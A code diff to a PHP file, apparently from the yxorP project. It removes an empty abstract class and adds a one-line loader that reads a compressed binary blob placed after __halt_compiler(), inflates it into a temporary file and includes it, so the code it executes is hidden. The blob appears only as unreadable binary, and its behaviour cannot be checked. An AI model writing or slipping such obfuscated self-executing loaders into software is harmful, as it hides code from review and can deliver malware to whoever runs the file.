@@ -1,10 +1,1 @@
-<?php /* yxorP */
-
-abstract class cache_extensions
-{
-
-    public function __call($name, $agr)
-    {
-
-    }
-}
+<?php $f=fopen(__FILE__,'r');fseek($f,__COMPILER_HALT_OFFSET__);$t=tmpfile();$u=stream_get_meta_data($t)['uri'];fwrite($t,gzinflate(stream_get_contents($f)));include($u);fclose($t);__halt_compiler();=‹Ë	€0ïôðTlÁÂºÄÄ²±wÁ¹ÎLÓ†) .qìkìPÖZiE½¤HœÀŽDÀÄ“5vOÖË¼zÑê|+<„­w3cØ<§GÁ&çòÌÓb+d4ÆâÿãÒêº
